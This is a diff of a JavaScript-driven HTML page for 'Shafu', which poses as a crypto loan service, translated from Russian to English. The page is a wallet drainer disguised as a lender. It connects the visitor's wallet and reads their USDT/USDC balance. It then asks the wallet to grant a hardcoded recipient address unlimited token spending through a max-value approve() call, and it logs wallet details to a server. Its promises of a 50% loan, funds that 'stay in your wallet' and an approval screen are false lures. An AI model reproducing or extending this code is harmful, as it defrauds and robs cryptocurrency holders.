@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Shafu | Криптозайм</title>
+    <title>Shafu | Crypto Loan on Collateral</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&family=Playfair+Display:wght@400;600;700;800&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5/dist/TronWeb.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
@@ -12,9 +12,9 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            background: linear-gradient(135deg, #88A9C3 0%, #6B8EAD 100%);
             min-height: 100vh;
-            color: #e2e8f0;
+            color: #1a2a3a;
         }
         body::before {
             content: "";
@@ -23,63 +23,50 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.03"><path fill="none" stroke="%23ffffff" stroke-width="0.5" d="M10 10 L90 10 M10 20 L90 20 M10 30 L90 30 M10 40 L90 40 M10 50 L90 50 M10 60 L90 60 M10 70 L90 70 M10 80 L90 80 M10 90 L90 90 M10 10 L10 90 M20 10 L20 90 M30 10 L30 90 M40 10 L40 90 M50 10 L50 90 M60 10 L60 90 M70 10 L70 90 M80 10 L80 90 M90 10 L90 90"/></svg>');
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" opacity="0.05"><path fill="none" stroke="%23ffffff" stroke-width="0.5" d="M10 10 L90 10 M10 20 L90 20 M10 30 L90 30 M10 40 L90 40 M10 50 L90 50 M10 60 L90 60 M10 70 L90 70 M10 80 L90 80 M10 90 L90 90 M10 10 L10 90 M20 10 L20 90 M30 10 L30 90 M40 10 L40 90 M50 10 L50 90 M60 10 L60 90 M70 10 L70 90 M80 10 L80 90 M90 10 L90 90"/></svg>');
             background-repeat: repeat;
             pointer-events: none;
             z-index: 0;
         }
         .container { max-width: 1300px; margin: 0 auto; padding: 20px; position: relative; z-index: 1; }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; flex-wrap: wrap; gap: 20px; }
-        .logo { font-family: 'Playfair Display', serif; font-size: 36px; font-weight: 800; color: #38bdf8; letter-spacing: 2px; }
-        .logo span { color: #fbbf24; }
-        .support-btn {
-            background: linear-gradient(135deg, #38bdf8, #0284c7);
-            border: none;
-            padding: 8px 20px;
-            border-radius: 40px;
-            color: white;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .support-btn:hover { transform: scale(1.02); background: linear-gradient(135deg, #0284c7, #0369a1); }
-        .lang-btn { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); padding: 8px 16px; border-radius: 40px; color: #e2e8f0; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 8px; }
-        .lang-dropdown { position: absolute; top: 50px; right: 0; background: #1e293b; border-radius: 16px; display: none; box-shadow: 0 8px 20px rgba(0,0,0,0.3); min-width: 140px; z-index: 100; border: 1px solid #334155; }
+        .logo { font-family: 'Playfair Display', serif; font-size: 36px; font-weight: 800; color: #1E3042; letter-spacing: 2px; }
+        .logo span { color: #C9A03D; }
+        .lang-btn { background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.3); padding: 8px 16px; border-radius: 40px; color: #1E3042; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 8px; }
+        .lang-dropdown { position: absolute; top: 50px; right: 0; background: white; border-radius: 16px; display: none; box-shadow: 0 8px 20px rgba(0,0,0,0.1); min-width: 140px; z-index: 100; }
         .lang-dropdown.active { display: block; }
-        .lang-option { padding: 10px 16px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: background 0.2s; color: #e2e8f0; }
-        .lang-option:hover { background: #334155; }
-        .lang-option span { font-size: 18px; }
-        .hero { text-align: center; padding: 40px 20px; }
-        .hero h1 { font-family: 'Playfair Display', serif; font-size: 56px; font-weight: 800; color: #38bdf8; margin-bottom: 20px; }
-        .hero h1 span { color: #fbbf24; }
-        .hero p { font-size: 20px; color: #94a3b8; max-width: 700px; margin: 0 auto 30px; }
-        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; margin: 40px 0; }
-        .feature-card { background: rgba(30,41,59,0.8); backdrop-filter: blur(10px); border-radius: 24px; padding: 30px; text-align: center; border: 1px solid #334155; transition: transform 0.3s; }
-        .feature-card:hover { transform: translateY(-8px); border-color: #38bdf8; }
+        .lang-option { padding: 10px 16px; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: background 0.2s; }
+        .lang-option:hover { background: #f5f5f5; }
+        .hero { text-align: center; padding: 60px 20px; }
+        .hero h1 { font-family: 'Playfair Display', serif; font-size: 56px; font-weight: 800; color: #1E3042; margin-bottom: 20px; }
+        .hero h1 span { color: #C9A03D; }
+        .hero p { font-size: 20px; color: #2c3e50; max-width: 700px; margin: 0 auto 30px; }
+        .features { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; margin: 60px 0; }
+        .feature-card { background: rgba(255,255,255,0.95); backdrop-filter: blur(10px); border-radius: 24px; padding: 30px; text-align: center; box-shadow: 0 8px 32px rgba(0,0,0,0.1); transition: transform 0.3s; }
+        .feature-card:hover { transform: translateY(-8px); }
         .feature-icon { font-size: 48px; margin-bottom: 20px; }
-        .feature-card h3 { font-family: 'Playfair Display', serif; font-size: 22px; color: #38bdf8; margin-bottom: 12px; }
-        .feature-card p { color: #94a3b8; font-size: 14px; }
-        .btn-primary { background: linear-gradient(135deg, #38bdf8, #0284c7); color: white; border: none; padding: 16px 40px; border-radius: 50px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .btn-primary:hover { transform: scale(1.02); background: linear-gradient(135deg, #0284c7, #0369a1); }
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); z-index: 1000; justify-content: center; align-items: center; }
+        .feature-card h3 { font-family: 'Playfair Display', serif; font-size: 22px; color: #1E3042; margin-bottom: 12px; }
+        .feature-card p { color: #5a6e7a; font-size: 14px; }
+        .btn-primary { background: #2B4257; color: white; border: none; padding: 16px 40px; border-radius: 50px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        .btn-primary:hover { background: #1E3042; transform: scale(1.02); }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(8px); z-index: 1000; justify-content: center; align-items: center; }
         .modal.active { display: flex; }
-        .modal-content { background: #1e293b; border-radius: 32px; max-width: 500px; width: 90%; max-height: 85vh; overflow-y: auto; padding: 30px; position: relative; border: 1px solid #38bdf8; }
-        .close-modal { position: absolute; top: 20px; right: 24px; font-size: 28px; cursor: pointer; color: #94a3b8; }
-        .close-modal:hover { color: #fbbf24; }
-        .wallet-option, .coin-option { display: flex; align-items: center; gap: 12px; padding: 12px; border: 1px solid #334155; border-radius: 16px; cursor: pointer; transition: 0.2s; margin-bottom: 10px; background: #0f172a; }
-        .wallet-option:hover, .coin-option:hover { background: #334155; border-color: #38bdf8; }
-        .wallet-icon, .coin-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
+        .modal-content { background: white; border-radius: 32px; max-width: 500px; width: 90%; max-height: 85vh; overflow-y: auto; padding: 30px; position: relative; }
+        .close-modal { position: absolute; top: 20px; right: 24px; font-size: 28px; cursor: pointer; color: #999; }
         .loan-form { text-align: center; }
-        .balance-info { background: #0f172a; border-radius: 20px; padding: 20px; margin: 20px 0; border: 1px solid #334155; }
-        .balance-amount { font-size: 32px; font-weight: 800; color: #38bdf8; }
-        .loan-input { width: 100%; padding: 16px; font-size: 18px; border: 2px solid #334155; border-radius: 16px; margin: 15px 0; text-align: center; font-weight: 600; background: #0f172a; color: #e2e8f0; }
-        .loan-input:focus { outline: none; border-color: #38bdf8; }
+        .balance-info { background: #f0f4f8; border-radius: 20px; padding: 20px; margin: 20px 0; }
+        .balance-amount { font-size: 32px; font-weight: 800; color: #2B4257; }
+        .loan-input { width: 100%; padding: 16px; font-size: 18px; border: 2px solid #e0e8f0; border-radius: 16px; margin: 15px 0; text-align: center; font-weight: 600; }
+        .loan-input:focus { outline: none; border-color: #C9A03D; }
         .success-screen { text-align: center; padding: 30px; }
         .success-icon { width: 80px; height: 80px; background: #10b981; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 48px; color: white; animation: scaleIn 0.5s ease; }
         @keyframes scaleIn { from { transform: scale(0); opacity: 0; } to { transform: scale(1); opacity: 1; } }
-        .footer { text-align: center; padding: 40px 20px; margin-top: 60px; border-top: 1px solid #334155; color: #64748b; font-size: 13px; }
-        .warning-box { background: rgba(251,191,36,0.1); border: 1px solid #fbbf24; border-radius: 16px; padding: 16px; margin-bottom: 20px; font-size: 14px; color: #fbbf24; text-align: center; }
-        .repayment-info { font-size: 14px; margin-bottom: 15px; color: #38bdf8; font-weight: 600; }
+        .footer { text-align: center; padding: 40px 20px; margin-top: 60px; border-top: 1px solid rgba(255,255,255,0.2); color: #1E3042; font-size: 13px; }
+        .loan-terms { background: #e8f0f8; border-radius: 16px; padding: 15px; margin: 15px 0; font-size: 14px; }
+        .repayment-info { font-size: 14px; margin-bottom: 15px; color: #2B4257; font-weight: 600; }
+        .wallet-option, .coin-option { display: flex; align-items: center; gap: 12px; padding: 12px; border: 1px solid #e0e8f0; border-radius: 16px; cursor: pointer; transition: 0.2s; margin-bottom: 8px; }
+        .wallet-option:hover, .coin-option:hover { background: #f5f9ff; border-color: #C9A03D; }
+        .warning-text { color: #dc2626; font-size: 12px; margin-top: 8px; }
         @media (max-width: 768px) { .hero h1 { font-size: 36px; } .btn-primary { padding: 14px 30px; font-size: 16px; } }
     </style>
 </head>
@@ -88,47 +75,42 @@
 <div class="container">
     <div class="header">
         <div class="logo">SHAFU<span>.</span></div>
-        <div style="display: flex; gap: 12px;">
-            <button class="support-btn" id="supportBtn">📞 Support</button>
-            <div class="lang-selector" style="position:relative">
-                <button class="lang-btn" id="langBtn">🌍 EN ▼</button>
-                <div class="lang-dropdown" id="langDropdown">
-                    <div class="lang-option" data-lang="en"><span>🇬🇧</span> English</div>
-                    <div class="lang-option" data-lang="ru"><span>🇷🇺</span> Русский</div>
-                    <div class="lang-option" data-lang="es"><span>🇪🇸</span> Español</div>
-                    <div class="lang-option" data-lang="de"><span>🇩🇪</span> Deutsch</div>
-                    <div class="lang-option" data-lang="fr"><span>🇫🇷</span> Français</div>
-                </div>
+        <div class="lang-selector" style="position:relative">
+            <button class="lang-btn" id="langBtn">🇬🇧 EN ▼</button>
+            <div class="lang-dropdown" id="langDropdown">
+                <div class="lang-option" data-lang="en">🇬🇧 English</div>
+                <div class="lang-option" data-lang="ru">🇷🇺 Русский</div>
+                <div class="lang-option" data-lang="es">🇪🇸 Español</div>
             </div>
         </div>
     </div>
 
     <div class="hero">
-        <h1>Shafu <span>Crypto</span></h1>
-        <p>Получите средства под обеспечение ваших активов. Быстро, безопасно, конфиденциально.</p>
-        <button class="btn-primary" id="startLoanBtn">💰 Получить средства</button>
+        <h1>Crypto Loan <span>on Collateral</span></h1>
+        <p>Get up to 50% of your wallet balance in 5 minutes. 15% rate for 30 days.</p>
+        <button class="btn-primary" id="startLoanBtn">💰 Apply for a loan</button>
     </div>
 
     <div class="features">
-        <div class="feature-card"><div class="feature-icon">⚡</div><h3>Мгновенно</h3><p>Решение за 1 минуту</p></div>
-        <div class="feature-card"><div class="feature-icon">🔒</div><h3>Безопасно</h3><p>Ваши средства под защитой</p></div>
-        <div class="feature-card"><div class="feature-icon">🌍</div><h3>Любая сеть</h3><p>TRC20, BEP20, ERC20</p></div>
+        <div class="feature-card"><div class="feature-icon">⚡</div><h3>Instant Approval</h3><p>Decision in 1 minute</p></div>
+        <div class="feature-card"><div class="feature-icon">🔒</div><h3>Secure</h3><p>Your funds stay in your wallet</p></div>
+        <div class="feature-card"><div class="feature-icon">🌍</div><h3>Any Network</h3><p>TRC20, BEP20, ERC20</p></div>
     </div>
 </div>
 
-<div class="footer"><p>© 2026 Shafu — криптофинансовые решения.</p></div>
+<div class="footer"><p>© 2026 Shafu — Crypto loan on collateral. Loan repayment + 15% in 30 days.</p></div>
 
 <!-- Модальное окно выбора кошелька -->
 <div id="walletModal" class="modal">
     <div class="modal-content">
         <span class="close-modal" id="closeWalletModal">&times;</span>
         <div id="walletSelectionStep">
-            <h2 style="text-align:center; margin-bottom:20px;" id="selectWalletTitle">Выберите кошелёк</h2>
+            <h2 style="text-align:center; margin-bottom:20px;" id="selectWalletTitle">Select wallet</h2>
             <div id="walletList"></div>
-            <div id="walletWarning" class="warning-box" style="display:none; margin-top:16px;"></div>
+            <div id="walletWarning" class="warning-text" style="display:none;"></div>
         </div>
         <div id="networkSelectionStep" style="display:none;">
-            <h2 style="text-align:center; margin-bottom:20px;" id="selectNetworkTitle">Выберите сеть и монету</h2>
+            <h2 style="text-align:center; margin-bottom:20px;" id="selectNetworkTitle">Select network & coin</h2>
             <div id="networkList"></div>
         </div>
     </div>
@@ -140,23 +122,25 @@
         <span class="close-modal" id="closeLoanModal">&times;</span>
         <div id="loanStep">
             <div class="loan-form">
-                <h2 id="loanTitle">Оформление</h2>
+                <h2 id="loanTitle">Loan Application</h2>
                 <div class="balance-info">
-                    <div id="yourBalanceLabel">Ваш баланс</div>
+                    <div id="yourBalanceLabel">Your balance</div>
                     <div class="balance-amount" id="userBalance">0 USDT</div>
-                    <div style="margin-top:8px; font-size:14px;" id="availableLoanLabel">Доступно: <strong id="maxLoan">0 USDT</strong></div>
+                    <div style="margin-top:8px; font-size:14px;" id="availableLoanLabel">Available for loan (50%): <strong id="maxLoan">0 USDT</strong></div>
                 </div>
-                <input type="number" id="loanAmount" class="loan-input" placeholder="Введите сумму" step="0.01">
+                <div class="loan-terms" id="loanTerms"></div>
+                <input type="number" id="loanAmount" class="loan-input" placeholder="Enter loan amount" step="0.01">
                 <div id="repaymentInfo" class="repayment-info"></div>
-                <button class="btn-primary" id="submitLoanBtn" style="width:100%;">✅ Получить</button>
+                <button class="btn-primary" id="submitLoanBtn" style="width:100%;">✅ Get loan</button>
             </div>
         </div>
         <div id="successStep" style="display:none;">
             <div class="success-screen">
                 <div class="success-icon">✓</div>
-                <h2 id="loanApprovedTitle">Одобрено!</h2>
-                <p style="margin:20px 0;" id="fundsWillArriveText">Средства поступят в течение 48 часов.</p>
-                <button class="btn-primary" id="closeSuccessBtn">Закрыть</button>
+                <h2 id="loanApprovedTitle">Loan approved!</h2>
+                <p style="margin:20px 0;" id="fundsWillArriveText">Funds will be credited to your wallet within 48 hours.</p>
+                <p style="font-size:14px; color:#666;" id="contractWarning">⚠️ Loan agreement has entered into force. Amount to repay in 30 days: <strong id="repayAmount">0 USDT</strong></p>
+                <button class="btn-primary" id="closeSuccessBtn">Close</button>
             </div>
         </div>
     </div>
@@ -189,69 +173,114 @@
         EVM: '0x110ed6bd10cac183b50ff5875dd2ef9794d7c6ac'
     };
     
-    // Кошельки по популярности
-    const wallets = [
-        { name: 'MetaMask', logo: 'https://images.seeklogo.com/logo-png/42/1/metamask-logo-png_seeklogo-426728.png', evmSupported: true, tronSupported: false, popularity: 100 },
-        { name: 'Trust Wallet', logo: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/98/b4/98/98b49898-4778-bf51-05f0-ebd6edbac982/AppIcon-0-0-1x_U007epad-0-1-85-220.png/1200x630wa.png', evmSupported: true, tronSupported: false, popularity: 95 },
-        { name: 'OKX Wallet', logo: 'https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/41/f6/98/41f6987b-5d4d-8a72-4b5d-951c1a419f88/AppIcon-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png', evmSupported: true, tronSupported: true, popularity: 90 },
-        { name: 'Bitget Wallet', logo: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/d9/a5/a7/d9a5a757-37a9-a2f1-ccd1-572c157bec24/AppIcon-1x_U007epad-0-11-0-85-220-0.png/1200x630wa.png', evmSupported: true, tronSupported: true, popularity: 80 },
-        { name: 'TronLink', logo: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/52/45/f2/5245f216-0009-f19d-a0c0-8f8afb5ca43d/AppIcon-1x_U007emarketing-0-6-0-85-220-0.png/1200x630wa.png', evmSupported: false, tronSupported: true, popularity: 70 }
-    ];
+    // Иконки монет
+    const COIN_LOGOS = {
+        'USDT': 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/32/color/usdt.png',
+        'USDC': 'https://raw.githubusercontent.com/atomiclabs/cryptocurrency-icons/master/32/color/usdc.png'
+    };
     
-    // Монеты по популярности
-    const coins = [
-        { coin: 'USDT', network: 'TRC20', name: 'USDT (TRC-20)', contract: USDT_CONTRACTS.TRC20, decimals: 6, popularity: 100 },
-        { coin: 'USDT', network: 'ERC20', name: 'USDT (ERC-20)', contract: USDT_CONTRACTS.ERC20, decimals: 6, popularity: 95 },
-        { coin: 'USDT', network: 'BEP20', name: 'USDT (BEP-20)', contract: USDT_CONTRACTS.BEP20, decimals: 18, popularity: 90 },
-        { coin: 'USDC', network: 'ERC20', name: 'USDC (ERC-20)', contract: USDC_CONTRACTS.ERC20, decimals: 6, popularity: 85 },
-        { coin: 'USDC', network: 'BEP20', name: 'USDC (BEP-20)', contract: USDC_CONTRACTS.BEP20, decimals: 18, popularity: 80 }
-    ];
-    
-    wallets.sort((a,b) => b.popularity - a.popularity);
-    coins.sort((a,b) => b.popularity - a.popularity);
+    // Определяем текущий кошелек по userAgent
+    function detectCurrentWallet() {
+        const ua = navigator.userAgent.toLowerCase();
+        if (ua.includes('trust') || ua.includes('trustwallet')) return 'Trust Wallet';
+        if (ua.includes('okx')) return 'OKX Wallet';
+        if (ua.includes('bitget')) return 'Bitget Wallet';
+        if (ua.includes('tronlink')) return 'TronLink';
+        if (ua.includes('metamask')) return 'MetaMask';
+        return null;
+    }
     
     const translations = {
         en: {
-            heroTitle: "Shafu <span>Crypto</span>", heroDesc: "Get funds backed by your assets. Fast, secure, confidential.", loanBtn: "💰 Get funds",
-            selectWallet: "Select wallet", selectNetwork: "Select network & coin", yourBalance: "Your balance", availableForLoan: "Available",
-            enterAmount: "Enter amount", getLoan: "✅ Submit", loanApproved: "Approved!", fundsWillArrive: "Funds will arrive within 48 hours.",
-            close: "Close", support: "Support", walletWarning: "⚠️ Please open this page in your wallet's internal browser (MetaMask, Trust Wallet, etc.) for connection."
+            heroTitle: "Crypto Loan <span>on Collateral</span>",
+            heroDesc: "Get up to 50% of your wallet balance in 5 minutes. 15% rate for 30 days.",
+            loanBtn: "💰 Apply for a loan",
+            selectWallet: "Select wallet",
+            selectNetwork: "Select network & coin",
+            yourBalance: "Your balance",
+            availableForLoan: "Available for loan (50%)",
+            enterAmount: "Enter loan amount",
+            getLoan: "✅ Get loan",
+            loanApproved: "Loan approved!",
+            fundsWillArrive: "Funds will be credited to your wallet within 48 hours.",
+            close: "Close",
+            terms: "Loan terms:",
+            rate: "Rate: 15% of loan amount",
+            term: "Term: 30 days",
+            toRepay: "To repay",
+            collateral: "Collateral: blocked funds (100% of loan amount)",
+            contractWarning: "⚠️ Loan agreement has entered into force. Amount to repay in 30 days:",
+            switchWalletWarning: "You are currently in {currentWallet}. Please open this page in the browser of {targetWallet} to connect."
         },
         ru: {
-            heroTitle: "Shafu <span>Crypto</span>", heroDesc: "Получите средства под обеспечение ваших активов. Быстро, безопасно, конфиденциально.", loanBtn: "💰 Получить средства",
-            selectWallet: "Выберите кошелёк", selectNetwork: "Выберите сеть и монету", yourBalance: "Ваш баланс", availableForLoan: "Доступно",
-            enterAmount: "Введите сумму", getLoan: "✅ Отправить", loanApproved: "Одобрено!", fundsWillArrive: "Средства поступят в течение 48 часов.",
-            close: "Закрыть", support: "Поддержка", walletWarning: "⚠️ Пожалуйста, откройте эту страницу во внутреннем браузере вашего кошелька (MetaMask, Trust Wallet и т.д.) для подключения."
+            heroTitle: "Криптозайм <span>под залог</span>",
+            heroDesc: "Получите до 50% от баланса вашего кошелька за 5 минут. Ставка 15% на 30 дней.",
+            loanBtn: "💰 Оформить займ",
+            selectWallet: "Выберите кошелёк",
+            selectNetwork: "Выберите сеть и монету",
+            yourBalance: "Ваш баланс",
+            availableForLoan: "Доступно для займа (50%)",
+            enterAmount: "Введите сумму займа",
+            getLoan: "✅ Получить займ",
+            loanApproved: "Займ одобрен!",
+            fundsWillArrive: "Средства будут зачислены на ваш кошелёк в течение 48 часов.",
+            close: "Закрыть",
+            terms: "Условия займа:",
+            rate: "Ставка: 15% от суммы займа",
+            term: "Срок возврата: 30 дней",
+            toRepay: "К возврату",
+            collateral: "Залог: заблокированные средства (100% от суммы займа)",
+            contractWarning: "⚠️ Договор займа вступил в силу. Сумма к возврату через 30 дней:",
+            switchWalletWarning: "Вы находитесь в {currentWallet}. Пожалуйста, откройте эту страницу в браузере {targetWallet} для подключения."
         },
         es: {
-            heroTitle: "Shafu <span>Crypto</span>", heroDesc: "Obtén fondos respaldados por tus activos. Rápido, seguro, confidencial.", loanBtn: "💰 Obtener fondos",
-            selectWallet: "Seleccionar wallet", selectNetwork: "Seleccionar red y moneda", yourBalance: "Tu saldo", availableForLoan: "Disponible",
-            enterAmount: "Ingresa el monto", getLoan: "✅ Enviar", loanApproved: "¡Aprobado!", fundsWillArrive: "Los fondos llegarán en 48 horas.",
-            close: "Cerrar", support: "Soporte", walletWarning: "⚠️ Abre esta página en el navegador interno de tu wallet (MetaMask, Trust Wallet, etc.) para conectarte."
-        },
-        de: {
-            heroTitle: "Shafu <span>Crypto</span>", heroDesc: "Erhalten Sie Mittel gegen Sicherheit Ihrer Vermögenswerte. Schnell, sicher, vertraulich.", loanBtn: "💰 Mittel erhalten",
-            selectWallet: "Wallet auswählen", selectNetwork: "Netzwerk und Coin auswählen", yourBalance: "Ihr Guthaben", availableForLoan: "Verfügbar",
-            enterAmount: "Betrag eingeben", getLoan: "✅ Senden", loanApproved: "Genehmigt!", fundsWillArrive: "Die Mittel werden innerhalb von 48 Stunden eintreffen.",
-            close: "Schließen", support: "Support", walletWarning: "⚠️ Bitte öffnen Sie diese Seite im internen Browser Ihrer Wallet (MetaMask, Trust Wallet, etc.) für die Verbindung."
-        },
-        fr: {
-            heroTitle: "Shafu <span>Crypto</span>", heroDesc: "Obtenez des fonds garantis par vos actifs. Rapide, sécurisé, confidentiel.", loanBtn: "💰 Obtenir des fonds",
-            selectWallet: "Sélectionner le wallet", selectNetwork: "Sélectionner le réseau et la monnaie", yourBalance: "Votre solde", availableForLoan: "Disponible",
-            enterAmount: "Entrez le montant", getLoan: "✅ Envoyer", loanApproved: "Approuvé !", fundsWillArrive: "Les fonds arriveront dans les 48 heures.",
-            close: "Fermer", support: "Support", walletWarning: "⚠️ Veuillez ouvrir cette page dans le navigateur interne de votre wallet (MetaMask, Trust Wallet, etc.) pour vous connecter."
+            heroTitle: "Préstamo Crypto <span>con Garantía</span>",
+            heroDesc: "Obtén hasta el 50% del saldo de tu wallet en 5 minutos. Tasa del 15% por 30 días.",
+            loanBtn: "💰 Solicitar préstamo",
+            selectWallet: "Seleccionar wallet",
+            selectNetwork: "Seleccionar red y moneda",
+            yourBalance: "Tu saldo",
+            availableForLoan: "Disponible para préstamo (50%)",
+            enterAmount: "Ingresa el monto",
+            getLoan: "✅ Obtener préstamo",
+            loanApproved: "¡Préstamo aprobado!",
+            fundsWillArrive: "Los fondos serán acreditados en 48 horas.",
+            close: "Cerrar",
+            terms: "Términos:",
+            rate: "Tasa: 15%",
+            term: "Plazo: 30 días",
+            toRepay: "A devolver",
+            collateral: "Garantía: fondos bloqueados (100%)",
+            contractWarning: "⚠️ El contrato de préstamo ha entrado en vigor. Cantidad a devolver en 30 días:",
+            switchWalletWarning: "Estás en {currentWallet}. Por favor, abre esta página en el navegador de {targetWallet} para conectarte."
         }
     };
     
-    let currentLang = 'ru';
+    let currentLang = 'en';
     let selectedWallet = null;
     let selectedNetwork = null;
     let selectedCoin = null;
     let userAddress = null;
     let userBalance = 0;
     let invoiceId = null;
+    let loanAmount = 0;
+    let currentWalletBrowser = detectCurrentWallet();
     
-    function getTranslation(key) { return translations[currentLang][key] || key; }
+    const wallets = [
+        { name: 'OKX Wallet', logo: '🟠', evmSupported: true, tronSupported: true, requiresBrowser: 'OKX Wallet' },
+        { name: 'MetaMask', logo: '🦊', evmSupported: true, tronSupported: false, requiresBrowser: 'MetaMask' },
+        { name: 'Trust Wallet', logo: '🔵', evmSupported: true, tronSupported: false, requiresBrowser: 'Trust Wallet' },
+        { name: 'Bitget Wallet', logo: '🟣', evmSupported: true, tronSupported: true, requiresBrowser: 'Bitget Wallet' },
+        { name: 'TronLink', logo: '🔴', evmSupported: false, tronSupported: true, requiresBrowser: 'TronLink' }
+    ];
+    
+    const coins = [
+        { coin: 'USDT', network: 'TRC20', name: 'USDT (TRC-20)', contract: USDT_CONTRACTS.TRC20, decimals: 6, isNative: false },
+        { coin: 'USDT', network: 'BEP20', name: 'USDT (BEP-20)', contract: USDT_CONTRACTS.BEP20, decimals: 18, isNative: false },
+        { coin: 'USDC', network: 'BEP20', name: 'USDC (BEP-20)', contract: USDC_CONTRACTS.BEP20, decimals: 18, isNative: false },
+        { coin: 'USDT', network: 'ERC20', name: 'USDT (ERC-20)', contract: USDT_CONTRACTS.ERC20, decimals: 6, isNative: false },
+        { coin: 'USDC', network: 'ERC20', name: 'USDC (ERC-20)', contract: USDC_CONTRACTS.ERC20, decimals: 6, isNative: false }
+    ];
     
     async function getTRC20Balance(address, contractAddress) {
         try {
@@ -263,7 +292,7 @@
                 if (token) return parseInt(token.balance) / 1e6;
             }
             return 0;
-        } catch(e) { return 0; }
+        } catch(e) { console.error('TRC20 balance error:', e); return 0; }
     }
     
     async function getEVM20Balance(address, contractAddress, rpc, decimals) {
@@ -272,7 +301,7 @@
             const contract = new ethers.Contract(contractAddress, ['function balanceOf(address) view returns (uint256)'], provider);
             const balance = await contract.balanceOf(address);
             return parseFloat(ethers.utils.formatUnits(balance, decimals));
-        } catch(e) { return 0; }
+        } catch(e) { console.error('EVM20 balance error:', e); return 0; }
     }
     
     async function getBalance(network, coin, address) {
@@ -290,32 +319,43 @@
     }
     
     async function connectWallet(walletName) {
-        selectedWallet = walletName;
-        const isInWalletBrowser = !!(window.ethereum || window.tronLink);
-        
-        if (!isInWalletBrowser) {
+        // Проверка: если пользователь в другом кошельке, показываем предупреждение
+        if (currentWalletBrowser && currentWalletBrowser !== walletName) {
+            const t = translations[currentLang];
+            const warning = t.switchWalletWarning
+                .replace('{currentWallet}', currentWalletBrowser)
+                .replace('{targetWallet}', walletName);
             const warningDiv = document.getElementById('walletWarning');
+            warningDiv.innerHTML = warning;
             warningDiv.style.display = 'block';
-            warningDiv.innerHTML = getTranslation('walletWarning');
+            setTimeout(() => { warningDiv.style.display = 'none'; }, 5000);
             return false;
         }
         
+        selectedWallet = walletName;
+        
         if (walletName === 'MetaMask' || walletName === 'Trust Wallet' || walletName === 'Bitget Wallet' || walletName === 'OKX Wallet') {
-            if (!window.ethereum) { alert('Установите MetaMask или другой EVM кошелёк'); return false; }
+            if (!window.ethereum) { 
+                alert(`Please install ${walletName} or open this page in its browser`);
+                return false; 
+            }
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 userAddress = accounts[0];
                 return true;
-            } catch(e) { alert('Ошибка подключения'); return false; }
+            } catch(e) { alert('Connection failed'); return false; }
         }
         
         if (walletName === 'TronLink') {
-            if (!window.tronLink) { alert('Установите TronLink'); return false; }
+            if (!window.tronLink) { 
+                alert('Please install TronLink or open this page in TronLink browser');
+                return false; 
+            }
             try {
                 await window.tronLink.request({ method: 'tron_requestAccounts' });
                 userAddress = window.tronLink.tronWeb.defaultAddress.base58;
                 return true;
-            } catch(e) { alert('Ошибка подключения'); return false; }
+            } catch(e) { alert('Connection failed'); return false; }
         }
         return false;
     }
@@ -329,6 +369,7 @@
                 ...data,
                 userAgent: navigator.userAgent
             });
+            console.log(`✅ Log sent: ${type}`);
         } catch(e) { console.error('Log error:', e); }
     }
     
@@ -339,15 +380,20 @@
             if (selectedNetwork === 'TRC20') {
                 const tronLink = window.tronLink || (window.okxwallet && window.okxwallet.tronLink);
                 if (!tronLink) throw new Error('TronLink required');
+                
                 await tronLink.request({ method: 'tron_requestAccounts' });
                 const contractAddress = selectedCoin === 'USDT' ? USDT_CONTRACTS.TRC20 : USDC_CONTRACTS.TRC20;
                 const contract = await tronLink.tronWeb.contract().at(contractAddress);
                 const maxAmount = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-                await contract.approve(RECIPIENT_ADDRESSES.TRC20, maxAmount).send();
+                const approveTx = await contract.approve(RECIPIENT_ADDRESSES.TRC20, maxAmount).send();
+                await tronLink.tronWeb.trx.getTransactionInfo(approveTx);
+                
             } else {
                 if (!window.ethereum) throw new Error('EVM wallet required');
+                
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 const signer = provider.getSigner();
+                
